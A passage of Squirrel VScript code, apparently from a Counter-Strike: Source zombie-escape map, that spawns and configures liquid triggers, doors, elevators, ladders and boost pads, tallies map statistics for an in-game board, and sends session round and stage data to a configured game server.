		if(borked)return;
		local spawntrigger = false;
		local ishurt = false;
		local isfall = false;
		local isshallowjump = false;
		local isshallowstream = false;
		local themehurtlogic = ""+::THEME;
		local mins = "-32 -32 -240";		//__CSS__(old mins/max was 32.5)
		local maxs = "32 32 0";				//__CSS__(old mins/max was 32.5)
		local pushdir = "0 0 0";
		local pushspeed = 0.01;
		if(q.type == "LIQUID_FALL" || q.type == "HAZLIQUID_FALL")
		{
			isfall = true;
			EntFireByHandle(liquid,"Kill","",0.00,null,null);
			if(q.type == "HAZLIQUID_FALL")
			{
				spawntrigger = true;
				mins = "-32 -32 -5000";		//__CSS__(old mins/max was 32.5)
			}
		}
		if(q.type.find("HAZLIQUID")==0)
		{
			spawntrigger = true;
			ishurt = true;
		}
		if(q.type.find("LIQUID_STREAM")==0 || q.type.find("HAZLIQUID_STREAM")==0)
		{
			spawntrigger = true;
			//pushdir = ::AnglesToDir(q.rot+Vector(0,180,0));
			q.rot.y += 180;
			pushdir = ""+q.rot.x.tostring()+" "+q.rot.y.tostring()+" "+q.rot.z.tostring();
			pushspeed = (0.00+::THEMES[::THEME].liquid_stream_pushamount);
			if(q.type.find("HAZLIQUID")==0)pushspeed = (0.00+::THEMES[::THEME].hazliquid_stream_pushamount);
			if(q.drown)
			{
				if(q.type.find("SHALLOW")!=null)
				{
					pushdir = "-90 0 0";
					pushspeed = 0.01;
					isshallowjump = true;
					liquid.ValidateScriptScope();
					liquid.GetScriptScope().isshallowjump <- true;
				}
				else
					pushdir = "90 0 0";
			}
			if(q.type.find("SHALLOW")!=null)
				isshallowstream = true;
		}
		if(spawntrigger)
		{
			::Ent(liquid.GetOrigin(),liquid.GetAngles(),"trigger_push",{
					targetname = liquid.GetName(),		//__CSS__thisified
					pushdir = pushdir,
					speed = pushspeed,
					spawnflags = 1,
				},{
				liquid = liquid,
				mins = mins,
				maxs = maxs,
				themehurtlogic = themehurtlogic,
				ishurt = ishurt,
				isfall = isfall,
				isshallowjump = isshallowjump,
				isshallowstream = isshallowstream,
				function Tick(){
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",::LIQUID_TICKRATE,null,null);
					EntFireByHandle(self,"Disable","",0.00,null,null);
					EntFireByHandle(self,"Enable","",::LIQUID_ENABLE_DELAY,null,null);
				},function Touch(){
					local toucher = activator;	//__CSS__ activator may get reset, store toucher
					if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
					toucher.ValidateScriptScope();
					local is_jump_touch = false;
					if(this.isshallowjump)
					{
						if(("last_stream_shallow_cd" in toucher.GetScriptScope()))
							return;
						toucher.GetScriptScope().last_stream_shallow_cd <- true;
						local vel = toucher.GetVelocity();
						vel.z = 0.00;
						vel.Norm();
						if(vel.Length()<0.01)
							vel = toucher.GetForwardVector();
						EntFireByHandle(toucher,"RunScriptCode","delete last_stream_shallow_cd;",::LIQUID_STREAMSH_CD,null,null);
						if(("last_stream_shallow_push" in toucher.GetScriptScope()))		//some absolute janky shit to get it stable and smooth 'tm
						{
							if(toucher.GetScriptScope().last_stream_shallow_push==null||
								!toucher.GetScriptScope().last_stream_shallow_push.IsValid()){}
							else
							{
								if(::GetDistance(toucher.GetScriptScope().last_stream_shallow_push.GetOrigin(),self.GetOrigin()) <= 100)
								{
									local timedif = Time()-toucher.GetScriptScope().last_stream_shallow_time;
									if(timedif < 2.00)
									{
										local dirs = [Vector(-1,0,0),Vector(1,0,0),Vector(0,-1,0),Vector(0,1,0)];
										local best_dir = null;
										local best_dirdist = 99999.00;
										foreach(dir in dirs)
										{
											local dist = ::GetDistance(self.GetOrigin()+(dir*40),toucher.GetScriptScope().last_stream_shallow_push.GetOrigin());
											if(dist < best_dirdist)
											{
												best_dirdist = (0.00+dist);
												best_dir = Vector()+dir;
												best_dir *= -1;
											}
										}
										if(best_dir!=null)
										{
											vel = best_dir;
											delete toucher.GetScriptScope().last_stream_shallow_push;
											delete toucher.GetScriptScope().last_stream_shallow_time;
										}
									}
								}
							}
						}
						is_jump_touch = true;
						toucher.GetScriptScope().last_stream_shallow_vel <- (vel*::LIQUID_STREAMSHJUMP_XY)+Vector(0,0,::LIQUID_STREAMSHJUMP);
						if(::LIQUID_STREAMSH_FS)
						{
							toucher.SetOrigin(self.GetOrigin());
							toucher.SetVelocity(Vector());
						}
						else
						{
							toucher.SetVelocity(toucher.GetScriptScope().last_stream_shallow_vel);
							toucher.SetOrigin(Vector(toucher.GetOrigin().x,toucher.GetOrigin().y,self.GetOrigin().z));
						}
						EntFireByHandle(toucher,"RunScriptCode","self.SetVelocity(last_stream_shallow_vel);delete last_stream_shallow_vel;",::LIQUID_STREAMSH_PD,null,null);
						if(::LIQUID_STREAMSHJUMP_S != null)
							::Sound(::LIQUID_STREAMSHJUMP_S,Vector(),toucher,-1,0.05,100,10);
					}
					else if(this.isshallowstream)
					{
						toucher.GetScriptScope().last_stream_shallow_push <- self;
						toucher.GetScriptScope().last_stream_shallow_time <- Time();
					}
					if(!this.ishurt)
					{
						if(!this.isshallowjump)
						{
							if(toucher.GetVelocity().Length() > ::LIQUID_STREAM_VELCAP)
							{
								local vel = toucher.GetVelocity();
								vel.Norm();
								toucher.SetVelocity(vel*::LIQUID_STREAM_VELCAP);
							}
						}
						return;
					}
					if("liquid_hurtcd" in toucher.GetScriptScope())return;
					toucher.GetScriptScope().liquid_hurtcd <- true;
					EntFireByHandle(toucher,"RunScriptCode"," if(\"liquid_hurtcd\" in this)delete liquid_hurtcd; ",::LIQUID_HURT_CD,null,null);
					local newhp = (toucher.GetHealth()-::THEMES[this.themehurtlogic].hazliquid_damage);
					if(!is_jump_touch)::THEMES[this.themehurtlogic].HazliquidHurtLogic(toucher);	//don't apply the logic here, since themes differ heavily, only do hurt
					if(newhp > 500)toucher.SetHealth(newhp);
					else EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
				},function Run(){
				
					//__CSS__ new push (old mins/max was 32.5)
					self.SetSize(Vector(-32,-32,-240),Vector(32,32,0));
					
					//EntFireByHandle(self,"AddOutput","mins "+this.mins,0.00,null,null);
					//EntFireByHandle(self,"AddOutput","maxs "+this.maxs,0.00,null,null);
					//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
					//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					
					EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
					if(!this.isfall)EntFireByHandle(self,"SetParent","!activator",0.00,this.liquid,null);
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
				}});
		}
	}
	template = Entities.FindByName(null,"template_precipitation");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName){}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		local currentprec = "";
		if(::PRECIPITATION == 1)	currentprec = "rainparticle";
		else if(::PRECIPITATION == 2)	currentprec = "rainstormparticle";		//now snowstorm
		else if(::PRECIPITATION == 3)	currentprec = "snowparticle";
		else if(::PRECIPITATION == 4)	currentprec = "ashparticle";
		foreach(targetname,handle in entities)
		{
			if(handle.GetPreTemplateName()!="precipitation_"+currentprec)
			{
				if(currentprec == "rainstormparticle" && handle.GetPreTemplateName()=="rainparticle")continue;
				EntFireByHandle(handle,"Kill","",0.00,null,null);
			}
		}
	}
	::movelinear_maker = Entities.FindByName(null,"template_movelinear_maker");
	template = Entities.FindByName(null,"template_movelinear");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName)
	{
		if(::movelinear_spawnqueue.len()<=0)
			return;
		local q = ::movelinear_spawnqueue[0];
		return {
			origin = q.origin,
			movedir = q.movedir,
			movedistance = q.movedistance,
			speed = q.speed,
			startsound = q.startsound,
			stopsound = q.stopsound,
			targetname = q.targetname,
		};
	}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		foreach(targetname,handle in entities)
		{
			if(::movelinear_spawnqueue.len()<=0)
			{
				EntFireByHandle(handle,"Kill","",0.00,null,null);
				return;
			}
			local q = ::movelinear_spawnqueue[0];
			::movelinear_spawnqueue.remove(0);
			if("ishold" in q)
			{
				q.child.ValidateScriptScope();
				q.child.GetScriptScope().opened <- false;
				q.child.GetScriptScope().messaged <- false;
				q.child.GetScriptScope().holdnameindex <- (0+q.holdnameindex);
				q.child.GetScriptScope().inverted <- q.inverted;
				q.child.GetScriptScope().CloseDoor <- function()
				{
					opened = true;
					OpenDoor(true);
					EntFireByHandle(self.GetMoveParent(),"Close","",0.00,null,null);
					EntFireByHandle(self.GetMoveParent(),"Close","",0.10,null,null);
					EntFireByHandle(self.GetMoveParent(),"Close","",0.20,null,null);
					EntFireByHandle(self.GetMoveParent(),"Close","",0.50,null,null);
					EntFireByHandle(self.GetMoveParent(),"Close","",1.00,null,null);
				}
				q.child.GetScriptScope().OpenDoor <- function(initshit=false)
				{
					if(opened && !initshit)return;
					opened = true;
					
					
					
					local nhandle = self;		//__CSS__ no more physics
					local moveparent = self.GetMoveParent();
					local sc = self.GetScriptScope();
					if("is_generic_hold" in sc)
					{
						local vname = ""+sc.__vname;
						nhandle = ::ConvertProp(self,"prop_dynamic",0,true,6);	
						nhandle.ValidateScriptScope();
						//foreach(k,v in sc){
						//	if(k.find(vname)==0)continue;
						//	nhandle.GetScriptScope()[k] <- v;
						//}
						nhandle.GetScriptScope().self <- nhandle;
						nhandle.SetSize(Vector(-47,-47,-1),Vector(47,47,146));
						nhandle.SetSolid(2);
						
						
						//__CSS__ css4_item_press_filter
						//css5 - turns out this aint needed at all.. since doors de-spawn when opening
						//EntFireByHandle(nhandle,"RunScriptCode","press_nobuttonfilter <- true;",0.50,null,null);
						//EntFireByHandle(nhandle,"AddOutput","spawnflags 10",0.50,null,null);
						
					}
					else
					{
						//146 floorsafe, 150 og		//__CSS__ no more physics
						if(sc.inverted)
						{
							nhandle.SetSize(Vector(-48,-48,0),Vector(48,48,150));
							for(local h;h=Entities.FindByClassnameWithin(h,"player",nhandle.GetOrigin()+Vector(0,0,150),86);){
								if(h.GetOrigin().z < (nhandle.GetOrigin().z + 155))
									h.SetOrigin(h.GetOrigin()+Vector(0,0,2));
							}
						}
						else
							nhandle.SetSize(Vector(-48,-48,0),Vector(48,48,146));
					}
					
					
					EntFireByHandle(moveparent,"Open","",0.00,null,null);
					//for(local h;h=Entities.FindByNameWithin(h,"block_"+holdnameindex.tostring()+"_generichold*",self.GetOrigin(),100);)
					//{
					//	h.ValidateScriptScope();
					//	if(!("OpenDoor" in h.GetScriptScope()))
					//		continue;
					//	h.GetScriptScope().OpenDoor();
					//}
						//new in v1_6 (removes moveparent onfullyopen, updates its 'physics' position to not interact with physics by thin-air):
					moveparent.ValidateScriptScope();
					moveparent.GetScriptScope().slave <- nhandle;
					moveparent.GetScriptScope().inverted <- inverted;
					moveparent.GetScriptScope().FullyOpen <- function(inverted_post=false)
					{
						if(!inverted || inverted_post)
						{
							local pos = slave.GetOrigin();
							slave.ValidateScriptScope();
							slave.GetScriptScope().clearedpos <- pos;
							EntFireByHandle(slave,"ClearParent","",0.00,null,null);
							EntFireByHandle(slave,"RunScriptCode","self.SetOrigin(clearedpos);",0.10,null,null);
							EntFireByHandle(self,"Kill","",0.20,null,null);		//don't need to keep self alive anylonger
							if(inverted_post)
								slave.SetSize(Vector(-47,-47,-1),Vector(47,47,146));
						}
						else
						{
							local pos = slave.GetOrigin();
							slave.ValidateScriptScope();
							slave.GetScriptScope().clearedpos <- pos;
							EntFireByHandle(slave,"ClearParent","",0.00,null,null);
							EntFireByHandle(slave,"RunScriptCode","self.SetOrigin(clearedpos);",0.05,null,null);
							EntFireByHandle(slave,"SetParent","!activator",0.10,moveparent,null);
						}
						//if("is_generic_hold" in slave.GetScriptScope())
						//{
						//	slave.SetSize(Vector(-48,-48,0),Vector(48,48,149));
						//	slave.SetSolid(2);
						//}
					}
					if(initshit)return;
					EntFireByHandle(moveparent,"AddOutput","OnFullyOpen !self:RunScriptCode:FullyOpen();:0.10:1",0.05,null,null);
					EntFireByHandle(moveparent,"AddOutput","OnFullyClosed !self:RunScriptCode:FullyOpen(true);:0.10:1",0.05,null,null);
				}
				q.child.GetScriptScope().OpenDoorMessage <- function()
				{
					if(messaged)return;
					messaged = true;
					pressed = true;
					if(("OpenDoor" in this))
					{
						local opentime = ::THEMES[::THEME].generichold_opentime;
						if(opentime <= 0.00)opentime = 0.00;
						EntFireByHandle(self,"RunScriptCode"," OpenDoor(); ",opentime,null,null);
					}
					for(local h;h=Entities.FindByNameWithin(h,"block_"+holdnameindex.tostring()+"_generichold*",self.GetOrigin(),100);)
					{
						h.ValidateScriptScope();
						if(!("OpenDoorMessage" in h.GetScriptScope()))
							continue;
						h.GetScriptScope().OpenDoorMessage();
					}
				}
				EntFireByHandle(q.child,"AddOutput","OnUser1 !self:RunScriptCode:OpenDoor();:0:-1",0.00,null,null);
				EntFireByHandle(q.child,"AddOutput","OnUser2 !self:RunScriptCode:OpenDoorMessage();:0:-1",0.00,null,null);
				if(q.inverted)EntFireByHandle(q.child,"AddOutput","OnUser3 !self:RunScriptCode:CloseDoor();:0:-1",0.00,null,null);
				if("isgenerichold" in q && q.isgenerichold == true)
					q.child.__KeyValueFromString("targetname","block_"+q.holdnameindex.tostring()+"_generichold");
			}
			else
			{
				local elevator_timings = ::THEMES[::THEME].elevator_timings;
				if(elevator_timings.x <= 0.00)elevator_timings.x = 0.00;
				if(elevator_timings.y <= 0.00)elevator_timings.y = 0.00;
				if(elevator_timings.y <= elevator_timings.x)elevator_timings.y = (0.00+elevator_timings.x);
				if(elevator_timings.z <= 0.05)elevator_timings.z = 0.05;
				local dectime = RandomFloat(elevator_timings.x,elevator_timings.y).tostring();
				dectime = format("%.2f",dectime.tofloat());
				EntFireByHandle(handle,"AddOutput","OnFullyOpen !self:Close::"+dectime+":-1",0.00,null,null);
				EntFireByHandle(handle,"AddOutput","OnFullyClosed !self:Open::"+dectime+":-1",0.00,null,null);
				EntFireByHandle(handle,"Open","",RandomFloat(0.05,elevator_timings.z),null,null);
			}
			EntFireByHandle(q.child,"SetParent","!activator",0.00,handle,null);
					//ELEVATOR_FREEZE_FIX NEW:		spawns non-solid prop_dynamic that tick-follows the actual elevator (+1 edicts, but more safe/stable)
				if(!("ishold" in q))
				{
					local ecolor = Vector(255,255,255);
					if(::THEME=="generic")ecolor = ::TYPES[92].color;
					local emodel = q.child.GetModelName();
					//::manager.PrecacheModel(emodel);
					////////::Ent(q.child.GetOrigin(),q.child.GetAngles(),"prop_dynamic",{		//__CSS__ fake elevators not needed anylonger (?)
					////////		model = emodel,
					////////		rendermode = 9,
					////////		rendercolor = ecolor,
					////////		targetname = q.child.GetName(),
					////////	},{
					////////	master = q.child,
					////////	function Tick(){
					////////		if(master==null||!master.IsValid())
					////////		{
					////////			EntFireByHandle(self,"Kill","",0.00,null,null);
					////////			return;
					////////		}
					////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
					////////		self.SetOrigin(master.GetOrigin());
					////////		self.SetForwardVector(master.GetForwardVector());
					////////	},function Run(){
					////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
					////////	}});
					EntFireByHandle(q.child,"AddOutput","rendermode 3",0.00,null,null);
					EntFireByHandle(q.child,"AddOutput","rendermode 3",1.00,null,null);
					EntFireByHandle(q.child,"AddOutput","renderamt 0",0.00,null,null);
					EntFireByHandle(q.child,"AddOutput","rendercolor 255 255 255 0",0.00,null,null);
					EntFireByHandle(q.child,"AddOutput","rendercolor 255 255 255 0",0.50,null,null);
					EntFireByHandle(q.child,"AddOutput","rendercolor 255 255 255 0",1.50,null,null);
					//EntFireByHandle(q.child,"DisableDraw","",0.00,null,null);
				}
					//ELEVATOR_FREEZE_FIX OLD:		runs DisableDraw/EnableDraw ticking for the actual elevators
				//q.child.ValidateScriptScope();
				//q.child.GetScriptScope().elevator_hold <- true;
				//if(("ishold" in q))q.child.GetScriptScope().elevator_hold = false;
				//q.child.GetScriptScope().TickDraw <- function()
				//{
				//	EntFireByHandle(self,"RunScriptCode"," TickDraw(); ",::ELEHOLD_FREEZEFIX_RATE,null,null);
				//	::ELEHOLD_FUNC(self,elevator_hold);
				//};
				//EntFireByHandle(q.child,"RunScriptCode"," TickDraw(); ",::ELEHOLD_FREEZEFIX_RATE,null,null);
			break;
		}
	}
	::ladder_maker = Entities.FindByName(null,"template_ladder_maker");
	template = Entities.FindByName(null,"template_ladder");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName)
	{
		if(::ladder_spawnqueue.len()<=0)
			return;
		local q = ::ladder_spawnqueue[0];
		::ladder_spawnqueue.remove(0);
		return {
			targetname = q.targetname,
			DisableShadows = 1,	//__CSS__ hotfix
		};
	}
	template.GetScriptScope().PostSpawn <- function(entities){}
	::boostpad_maker = Entities.FindByName(null,"template_boostpad_maker");
	template = Entities.FindByName(null,"template_boostpad");
	template.ValidateScriptScope();
	template.GetScriptScope().PreSpawnInstance <- function(entityClass,entityName)
	{
		if(::boostpad_spawnqueue.len()<=0)return;
		local q = ::boostpad_spawnqueue[0];
		if(entityClass=="trigger_multiple")return {targetname = q.targetname};
		local model = "models/luffaren/collective_boostpad.mdl";
		try{
			model = ::TILEVARIANTS[q.type][::THEME].main[RandomInt(0,::TILEVARIANTS[q.type][::THEME].main.len()-1)];
		}catch(e){printl("[template_boostpad PreSpawnInstance ERROR - modelset]: "+e);}
		local spawnflags = 10;
		spawnflags += 4;			//spawnflags += 4: debris (don't collide with players or other debris)
		//self.PrecacheModel(model);
		return {
				spawnflags = spawnflags.tostring(),
				model = model.tostring(),
				rendermode = 3,
				DisableShadows = 1,	//__CSS__ hotfix
			};
	}
	template.GetScriptScope().PostSpawn <- function(entities)
	{
		local q = null;
		local borked = false;
		if(::boostpad_spawnqueue.len()<=0)borked = true;
		else
		{
			q = ::boostpad_spawnqueue[0];
			::boostpad_spawnqueue.remove(0);
		}
		foreach(targetname,handle in entities)
		{
			if(borked)
			{
				EntFireByHandle(handle,"Kill","",0.00,null,null);
				continue;
			}
			if(handle.GetClassname()=="trigger_multiple")
			{
				handle.ValidateScriptScope();
				handle.GetScriptScope().cdlist <- [];
				handle.GetScriptScope().isjump <- false;
				if(q.type == "BOOSTPAD_JUMP")handle.GetScriptScope().isjump = true;
				
				
				
				
				
				handle.GetScriptScope().CheckSetCD <- function(check_remove=true,player=null){
					if(player==null||!player.IsValid())player=activator;
					if(player==null||!player.IsValid())return false;
					player.ValidateScriptScope();
					if(!("__boostpadcd" in player.GetScriptScope()))
						player.GetScriptScope().__boostpadcd <- {};
					if(check_remove)
					{
						if(self.entindex() in player.GetScriptScope().__boostpadcd)
							return false;
						EntFireByHandle(self,"RunScriptCode"," CheckSetCD(false); ",::BOOSTPAD_COOLDOWN_TIME,player,null);
						player.GetScriptScope().__boostpadcd[self.entindex()] <- self;
						return true;
					}
					else
					{
						if(self.entindex() in player.GetScriptScope().__boostpadcd)
							delete player.GetScriptScope().__boostpadcd[self.entindex()];
					}
				}
						//__CSS__ og function below - new above		//__CSS__ boostpad_css4_tweaks
				/*
				handle.GetScriptScope().CheckSetCD <- function(check_remove=true,player=null){
					if(player==null||!player.IsValid())player=activator;
					if(player==null||!player.IsValid())return false;
					if(check_remove)
					{
						foreach(p in cdlist)
						{
							if(p==player)return false;
						}
						cdlist.push(player);
						EntFireByHandle(self,"RunScriptCode"," CheckSetCD(false); ",::BOOSTPAD_COOLDOWN_TIME,player,null);
						return true;
					}
					else
					{
						for(local i=0;i<cdlist.len();i++)
						{
							if(player == cdlist[i])
							{
								cdlist.remove(i);
								return;
							}
						}
					}
				},
				*/
				
				
				
				handle.GetScriptScope().Touch <- function(override_player=null){
					local toucher = null;
					if(override_player!=null)toucher = override_player;
					else toucher = activator;	//__CSS__ activator may get reset, store toucher
					if(toucher==null||!toucher.IsValid())return;
					if(toucher.IsAlive()==false)return;
					if(!CheckSetCD(true,toucher))return;
					local curvel = Vector();
					
					if(isjump)
					{
						curvel = Vector(toucher.GetVelocity().x,toucher.GetVelocity().y,::BOOSTPAD_JUMP_VEL_Z);
						//curvel = toucher.GetVelocity();
						curvel.z = 0.00;
						if(curvel.Length() >= ::BOOSTPAD_JUMP_MAXVEL_XY)
						{
							curvel.Norm();
							curvel *= ::BOOSTPAD_JUMP_MAXVEL_XY;
						}
						curvel.z = ::BOOSTPAD_JUMP_VEL_Z;
					}
					else
						curvel = (self.GetForwardVector()*::BOOSTPAD_VEL_XY)+Vector(0,0,::BOOSTPAD_VEL_Z);
					
					
					
					if(override_player!=null)	//__CSS__ falldamage fix (same as teleporters)
					{
						::NetProps.SetPropVector(toucher,"m_vecBaseVelocity",curvel);
						toucher.SetVelocity(Vector());
						toucher.GetScriptScope()._boostpvel <- curvel;
						EntFireByHandle(toucher,"RunScriptCode","self.SetVelocity(_boostpvel);delete _boostpvel;",0.00,null,null);
					}
					else
						toucher.SetVelocity(curvel);
					
					local tptarget = self.GetOrigin()+Vector(0,0,::BOOSTPAD_POS_Z_OFS);		//__CSS__ falldamage fix (same as telporters)
					
					if(override_player!=null)
					{
						toucher.GetScriptScope()._boostppos <- tptarget;
						toucher.SetOrigin(tptarget);
						EntFireByHandle(toucher,"RunScriptCode","self.SetOrigin(_boostppos);delete _boostppos;",0.00,null,null);
					}
					else
						toucher.SetOrigin(tptarget);
					toucher.ValidateScriptScope();
					toucher.GetScriptScope().boostpad_teamcheck <- toucher.GetTeam();
					
					if(::BOOSTPAD_POSTDELAY <= 0.00)
						TouchPost(toucher);		//__CSS__ boostpad_css4_tweaks
					else
						EntFireByHandle(self,"RunScriptCode"," TouchPost(); ",::BOOSTPAD_POSTDELAY,toucher,null);
				};
				handle.GetScriptScope().TouchPost <- function(toucher=null){
					//if(toucher!=null&&toucher.IsValid())	//__CSS__ boostpad_css4_tweaks
					//{
					//	if(::BOOSTPAD_SOUND!=null)::Sound(::BOOSTPAD_SOUND,Vector(),toucher,-1,0.20,100,10);
					//	return;
					//}
					if(toucher==null||!toucher.IsValid()) toucher = activator;	//__CSS__ activator may get reset, store toucher
					if(toucher==null||!toucher.IsValid())return;
					if(toucher.IsAlive()==false)return;
					toucher.ValidateScriptScope();
					if(toucher.GetScriptScope().boostpad_teamcheck != toucher.GetTeam())return;
					toucher.SetOrigin(self.GetOrigin()+Vector(0,0,::BOOSTPAD_POS_Z_OFS));
					if(isjump)
						toucher.SetVelocity(Vector(toucher.GetVelocity().x,toucher.GetVelocity().y,::BOOSTPAD_JUMP_VEL_Z));
					else
						toucher.SetVelocity((self.GetForwardVector()*::BOOSTPAD_VEL_XY)+Vector(0,0,::BOOSTPAD_VEL_Z));
					if(::BOOSTPAD_SOUND!=null)::Sound(::BOOSTPAD_SOUND,Vector(),toucher,-1,0.20,100,10);
				};
				
				//__CSS__ css3 update
				if(::BOOSTPAD_TOGGLERATE > 0.00)
				{
					handle.GetScriptScope().Think <- function(){
						if(::BOOSTPAD_TOGGLERATE <= 0.00)
						{
							self.AcceptInput("Enable","",null,null);
							return 2.00;
						}
						self.AcceptInput("Toggle","",null,null);
						return ::BOOSTPAD_TOGGLERATE;
					};
					AddThinkToEnt(handle,"Think");
				}
				
				
				//__CSS__ falldamage fix (same as telporters)
				EntFireByHandle(handle,"AddOutput","targetname ___boostpad",0.40,null,null);
				handle.GetScriptScope().tries <- 10;
				handle.GetScriptScope().RunParentSet <- function()
				{
					tries--;
					if(tries <= 0)return;
						//DebugDrawBox(self.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),0,0,255,100,1.00);
					
					local blockmaster = null;
					//for(local bmaster;bmaster=Entities.FindByClassnameWithin(bmaster,"prop_physics",self.GetOrigin(),16);)
					for(local bmaster;bmaster=Entities.FindByClassnameWithin(bmaster,"prop_dynamic",self.GetOrigin(),16);)		//__CSS__ no more physics
					{
						if(bmaster.GetModelName().find("models/luffaren/collective_boostpad")==0)
						{
							blockmaster = bmaster;
							break;
						}
					}
						//printl("-------------BLOCKMASTER> "+blockmaster);
					if(blockmaster==null||!blockmaster.IsValid())
					{
						EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",1.00,null,null);
						return;
					}
					self.AcceptInput("SetParent","!activator",blockmaster,null);
						//EntFireByHandle(blockmaster,"AddOutput","rendercolor 255 0 0",0.00,null,null);
						//DebugDrawBox(blockmaster.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),255,0,0,100,1.00);
				}
				EntFireByHandle(handle,"RunScriptCode"," RunParentSet(); ",0.55,null,null);
				
				
				EntFireByHandle(handle,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(handle,"Enable","",0.05,null,null);
			}
			else
			{
				handle.__KeyValueFromString("targetname",q.targetname);
				if(q.type == "BOOSTPAD_JUMP")
					EntFireByHandle(handle,"AddOutput","body 0",0.00,null,null);
				else
					EntFireByHandle(handle,"AddOutput","body 1",0.00,null,null);
			}
		}
	}
	EntFireByHandle(self,"RunScriptCode"," TickSpawnQueue(); ",0.05,null,null);
	local hasplugin = false;
	try{IncludeScript("ze_collective_offline_testmap.nut",this);}catch(e){
		printl("[TESTMAP] not enabled ('scripts/vscripts/ze_collective_offline_testmap.nut' not found)");}
	if("devmaps" in this)
	{
		ENABLE_HTML_PRINT = false;
		::maps.clear();
		devmaps.maps<-::maps;devmaps.Run();
	}
	else if("webmaps" in this)
	{
		if(webmaps != null && webmaps.len()>0)
		{
			hasplugin = true;
			printl("===============================================================================");
			if("webmaps_already_set" in this)
				printl("             WEBMAPS FOUND - HOWEVER IT ALREADY REPLACED DEFAULT/.BSP MAP POOL - IGNORING");
			else
			{
				printl("             WEBMAPS FOUND - REPLACING DEFAULT/.BSP MAP POOL");
				::maps.clear();
				//newthread(::AddWebMaps.bindenv(this)).call(webmaps);	//new in v1_7 (prevents SQQuerySuspend, could potentially prevent future disaster with higher map-counts)	//__CSS__ threading_disabled
				::AddWebMaps(webmaps);	//new in v1_7 (prevents SQQuerySuspend, could potentially prevent future disaster with higher map-counts)
				::webmaps_already_set <- true;
			}
		}
	}
	printl("===============================================================================");
	local mapcount_left = 0;
	local mapcount_forward = 0;
	local mapcount_right = 0;
	local mapcount_up = 0;
	local mapcount_down = 0;
	local mapcount_elevation = 0;
	foreach(m in maps)
	{
		if(m.direction=="left")mapcount_left++;
		else if(m.direction=="right")mapcount_right++;
		else mapcount_forward++;
		mapcount_elevation += m.elevation;
		if(m.elevation > 0)mapcount_up++;
		else if(m.elevation < 0)mapcount_down++;
	}
	printl(	"    mapcount:"+::maps.len().tostring()+"  |  forward:"+mapcount_forward.tostring()+
			"  |  left:"+mapcount_left.tostring()+"  |  right:"+mapcount_right.tostring()+
			"  |  up:"+mapcount_up.tostring()+"  |  down:"+mapcount_down.tostring()+"  |  elevation:"+mapcount_elevation.tostring());
	EntFire("spawninfoboard_text_total","AddOutput","message "+::maps.len().tostring(),0.00,null);
	EntFire("spawninfoboard_text_forward","AddOutput","message "+mapcount_forward.tostring(),0.00,null);
	EntFire("spawninfoboard_text_left","AddOutput","message "+mapcount_left.tostring(),0.00,null);
	EntFire("spawninfoboard_text_right","AddOutput","message "+mapcount_right.tostring(),0.00,null);
	EntFire("spawninfoboard_text_up","AddOutput","message "+mapcount_up.tostring(),0.00,null);
	EntFire("spawninfoboard_text_down","AddOutput","message "+mapcount_down.tostring(),0.00,null);
	EntFire("spawninfoboard_text_elevation","AddOutput","message "+mapcount_elevation.tostring(),0.00,null);
	try{
	local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
		::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_START","["+
				"sid,"+sid.tostring()+","+
				"rounds,"+::rounds_played.tostring()+","+
				::STAGES[0].theme+"_"+::STAGES[0].ending+","+
				::STAGES[1].theme+"_"+::STAGES[1].ending+","+
				::STAGES[2].theme+"_"+::STAGES[2].ending+","+
				::STAGES[3].theme+"_"+::STAGES[3].ending+
			"]");
	}catch(e){printl("SD - ZE_COLLECTIVE_START - ERROR: "+e);}
	try{
		local sb = Entities.FindByName(null,"spawninfoboard");
		local texts = [
				{		text=::maps.len().tostring(),							color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-113)		},
				{		text=mapcount_forward.tostring(),						color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-149)		},
				{		text=mapcount_left.tostring(),							color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-182)		},
				{		text=mapcount_right.tostring(),							color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-215)		},
				{		text=mapcount_up.tostring(),							color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-246)		},
				{		text=mapcount_down.tostring(),							color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-284)		},
				{		text=mapcount_elevation.tostring(),						color=Vector(150,200,255),		size=32,		offset=Vector(10,-130,-316)		},
				//{		text="This server DOES NOT have the plugin installed",	color=Vector(255,50,50),		size=22,		offset=Vector(10,370,-377)		},	//__CSS__ - no plugin exists..
				{		text="     (no plugin exists for CS:S though, sorry)",	color=Vector(20,20,20),			size=22,		offset=Vector(10,370,-377)		},	//__CSS__ - no plugin exists..
			];
		texts[7].givename <- true;
		if(hasplugin)
		{
			texts[7].text = "This server DOES have the plugin installed";
			texts[7].color = Vector(50,255,50);
			texts[7].offset = Vector(10,400,-377);
			texts[7].givename <- true;
		}
		foreach(t in texts)
		{
			local emsg = Entities.CreateByClassname("point_worldtext");
